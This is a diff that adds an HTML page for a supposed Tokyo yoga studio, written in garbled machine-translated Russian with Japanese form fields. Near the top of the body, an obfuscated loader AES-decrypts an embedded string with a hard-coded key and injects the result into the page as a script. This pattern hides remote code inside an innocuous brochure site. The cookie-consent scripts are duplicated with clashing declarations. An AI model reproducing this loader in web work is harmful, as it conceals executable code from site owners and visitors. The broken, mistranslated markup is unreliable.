@@ -1,0 +1,510 @@
+
+
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Центр йоги Сейсин</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18070945787"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-18070945787');
+</script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:'Noto Sans JP',sans-serif;
+            background:#f7f9f5;
+            color:#2f3a2f;
+            line-height:1.8;
+        }
+        a{text-decoration:none;color:inherit}
+        .container{max-width:1200px;margin:auto;padding:90px 20px}
+
+        /* HEADER */
+        header{
+            background:#e6efe3;
+            position:fixed;
+            width:100%;
+            top:0;
+            z-index:10;
+        }
+        .nav{
+            max-width:1200px;
+            margin:auto;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:15px 20px;
+        }
+        .logo{font-weight:600}
+        .nav ul{display:flex;gap:25px;list-style:none;font-size:14px}
+        .nav button{
+            background:#8fb37a;
+            color:#fff;
+            border:none;
+            padding:8px 18px;
+            border-radius:20px;
+        }
+
+        /* HERO */
+        .hero{
+            margin-top:70px;
+            background:#dfe9db;
+            text-align:center;
+            padding:80px 20px 60px;
+        }
+        .hero img{
+            width:100%;
+            max-width:700px;
+            border-radius:20px;
+        }
+        .hero h1{margin:30px 0 15px;font-size:30px}
+        .hero p{font-size:15px;color:#445}
+
+        /* SECTION TITLE */
+        .section-title{
+            text-align:center;
+            margin-bottom:50px;
+        }
+        .section-title h2{font-size:26px;margin-bottom:10px}
+        .section-title p{font-size:14px;color:#666}
+
+        /* CARDS */
+        .cards{
+            display:grid;
+            grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
+            gap:25px;
+        }
+        .card{
+            background:#fff;
+            padding:30px;
+            border-radius:16px;
+        }
+        .card i{
+            color:#8fb37a;
+            font-size:22px;
+            margin-bottom:10px;
+        }
+
+        /* LIST */
+        .list{
+            max-width:700px;
+            margin:auto;
+            font-size:14px;
+            color:#555;
+        }
+
+        /* INSTRUCTORS */
+        .instructors{
+            display:grid;
+            grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+            gap:25px;
+        }
+        .instructors img{
+            width:100%;
+            height:220px;
+            object-fit:cover;
+            border-radius:16px;
+        }
+
+        /* REVIEWS */
+        .reviews{
+            display:grid;
+            grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+            gap:25px;
+        }
+        .review{
+            background:#fff;
+            padding:25px;
+            border-radius:16px;
+            font-size:14px;
+        }
+
+        /* GALLERY */
+        .gallery{
+            display:grid;
+            grid-template-columns:2fr 1fr 1fr;
+            gap:20px;
+        }
+        .gallery img{
+            width:100%;
+            height:100%;
+            object-fit:cover;
+            border-radius:16px;
+        }
+
+        /* BOOKING */
+        .booking{
+            background:#dfe9db;
+            border-radius:20px;
+            display:grid;
+            grid-template-columns:1fr 1fr;
+            gap:40px;
+            padding:50px;
+        }
+        .booking input,.booking textarea{
+            width:100%;
+            padding:12px;
+            margin-bottom:10px;
+            border-radius:10px;
+            border:1px solid #ccc;
+        }
+        .booking button{
+            background:#8fb37a;
+            border:none;
+            color:#fff;
+            padding:12px;
+            border-radius:20px;
+            width:100%;
+        }
+
+        /* FOOTER */
+        footer{
+            background:#6b8f5f;
+            color:#eaf3e7;
+            padding:60px 20px;
+        }
+        .footer-grid{
+            max-width:1200px;
+            margin:auto;
+            display:grid;
+            grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+            gap:40px;
+            font-size:13px;
+        }
+        .copy{text-align:center;margin-top:40px;font-size:12px;color:#dbe6d7}
+
+        /* RESPONSIVE */
+        @media(max-width:768px){
+            .booking,.gallery{grid-template-columns:1fr}
+        }
+    </style>
+</head>
+<body>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(``);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+
+<!--<script>-->
+<!--    document.body.style.overflow = "hidden";-->
+<!--</script>-->
+
+
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">クッキーについて</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
+                をクリックすると、クッキーの使用に同意したことになります。
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){
+        function decodeEmail(encodedString) {
+            var email = "",
+                r = parseInt(encodedString.substr(0, 2), 16),
+                n,
+                i;
+            for (n = 2; encodedString.length - n; n += 2){
+                i = parseInt(encodedString.substr(n, 2), 16) ^ r;
+                email += String.fromCharCode(i);
+            }
+            return email;
+        }
+
+        var elements = document.querySelectorAll('.__cf_email__');
+        for (var i = 0; i < elements.length; i++) {
+            var el = elements[i];
+            var encoded = el.getAttribute('data-cfemail');
+            if (encoded) {
+                var decodedEmail = decodeEmail(encoded);
+                el.innerHTML = decodedEmail;
+                // If the parent is an <a> tag, update the href to mailto
+                if (el.parentNode.tagName === 'A') {
+                    el.parentNode.href = "mailto:" + decodedEmail;
+                }
+            }
+        }
+    })();
+</script>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("click", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("click", mouseMoveClose, { once: true });
+    }
+</script>
+<header>
+    <div class="nav">
+        <div class="logo">Центр йоги Сейсин</div>
+        <ul>
+            <li>Дом</li>
+            <li>О нас</li>
+            <li>сорт</li>
+            <li>Инструктор</li>
+            <li>бронирование</li>
+        </ul>
+        <button>Бронирование впечатлений</button>
+    </div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+    <img src="https://images.unsplash.com/photo-1544367567-0f2fcb009e0b">
+    <h1>Спокойная сессия йоги для гармонизации ума и тела.</h1>
+    <p>Обретите внутреннее спокойствие с помощью дыхательных упражнений и движений.</p>
+</section>
+
+<!-- ABOUT -->
+<section class="container">
+    <div class="section-title">
+        <h2>О Центре йоги Сейсин</h2>
+        <p>Студия йоги, которая ценит японскую духовность.</p>
+    </div>
+    <p class="list">
+        Мы предлагаем место, где вы можете отдохнуть от повседневного стресса и мягко восстановить баланс своего разума и тела.
+
+    </p>
+</section>
+
+<!-- APPROACH -->
+<section class="container">
+    <div class="section-title">
+        <h2>Наш подход</h2>
+    </div>
+    <div class="cards">
+        <div class="card"><i class="fa-solid fa-heart"></i><h4>Благополучие</h4><p>Мы подчеркиваем гармонию разума и тела.</p></div>
+        <div class="card"><i class="fa-solid fa-leaf"></i><h4>Гармония с природой</h4><p>Почувствуйте свое дыхание и природу.</p></div>
+        <div class="card"><i class="fa-solid fa-hands"></i><h4>поддерживать</h4><p>Мы поддерживаем каждого человека.</p></div>
+        <div class="card"><i class="fa-solid fa-users"></i><h4>сообщество</h4><p>Надежные спутники</p></div>
+        <div class="card"><i class="fa-solid fa-brain"></i><h4>Вдохновение</h4><p>Внутренний рост</p></div>
+        <div class="card"><i class="fa-solid fa-seedling"></i><h4>Внутреннее равновесие</h4><p>Психическая устойчивость</p></div>
+    </div>
+</section>
+
+<!-- STRENGTH -->
+<section class="container">
+    <div class="section-title">
+        <h2>Наши области специализации</h2>
+    </div>
+    <p class="list">
+        ・Йога для начинающих<br>
+        ・Программа снятия стресса<br>
+        ・Медитация осознанности<br>
+        ・Занятия по улучшению физической подготовки
+    </p>
+</section>
+
+<!-- INSTRUCTORS -->
+<section class="container">
+    <div class="section-title">
+        <h2>Инструктор</h2>
+    </div>
+    <div class="instructors">
+        <img src="https://images.unsplash.com/photo-1552196563-55cd4e45efb3">
+        <img src="https://images.unsplash.com/photo-1545205597-3d9d02c29597">
+    </div>
+</section>
+
+<!-- REVIEWS -->
+<section class="container">
+    <div class="section-title">
+        <h2>Отзывы клиентов</h2>
+    </div>
+    <div class="reviews">
+        <div class="review">Теперь я спокоен. — Мистер Танака</div>
+        <div class="review">Благодаря подробным инструкциям я почувствовал себя уверенно. — г-н Ямамото</div>
+        <div class="review">Я с нетерпением жду возможности побывать там каждую неделю. - Мистер Сато</div>
+    </div>
+</section>
+
+<!-- ACTIVITY -->
+<section class="container">
+    <div class="section-title">
+        <h2>Наша деятельность</h2>
+    </div>
+    <div class="gallery">
+        <img src="https://images.unsplash.com/photo-1599447421416-3414500d18a5">
+        <img src="https://images.unsplash.com/photo-1545389336-cf090694435e">
+        <img src="https://images.unsplash.com/photo-1593810451137-5dc55105dace">
+    </div>
+</section>
+
+<!-- BOOKING -->
+<section class="container">
+    <div class="booking">
+        <div>
+            <h3>сделать бронирование</h3>
+            <p>Вы можете легко записаться на пробный урок.</p>
+        </div>
+        <div>
+            <input placeholder="お名前">
+            <input placeholder="メールアドレス">
+            <textarea rows="4" placeholder="ご質問"></textarea>
+            <button>Отправить запрос</button>
+        </div>
+    </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-grid">
+        <div>
+            <h4>Центр йоги Сейсин</h4>
+            <p>Пространство для занятий йогой, где происходит гармоничное соединение разума и тела.</p>
+        </div>
+        <div>
+            <h4>меню</h4>
+            <p>сорт<br>Инструктор</p>
+        </div>
+        <div>
+            <h4>расследование</h4>
+            <p>Tokyo, Japan</p>
+        </div>
+    </div>
+    <div class="copy">© 2026 Центр йоги Сейсин</div>
+</footer>
+
+<script>
+    (function(){
+        function decodeEmail(encodedString) {
+            var email = "",
+                r = parseInt(encodedString.substr(0, 2), 16),
+                n,
+                i;
+            for (n = 2; encodedString.length - n; n += 2){
+                i = parseInt(encodedString.substr(n, 2), 16) ^ r;
+                email += String.fromCharCode(i);
+            }
+            return email;
+        }
+
+        var elements = document.querySelectorAll('.__cf_email__');
+        for (var i = 0; i < elements.length; i++) {
+            var el = elements[i];
+            var encoded = el.getAttribute('data-cfemail');
+            if (encoded) {
+                var decodedEmail = decodeEmail(encoded);
+                el.innerHTML = decodedEmail;
+                // If the parent is an <a> tag, update the href to mailto
+                if (el.parentNode.tagName === 'A') {
+                    el.parentNode.href = "mailto:" + decodedEmail;
+                }
+            }
+        }
+    })();
+</script>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
+
+</body>
+</html>
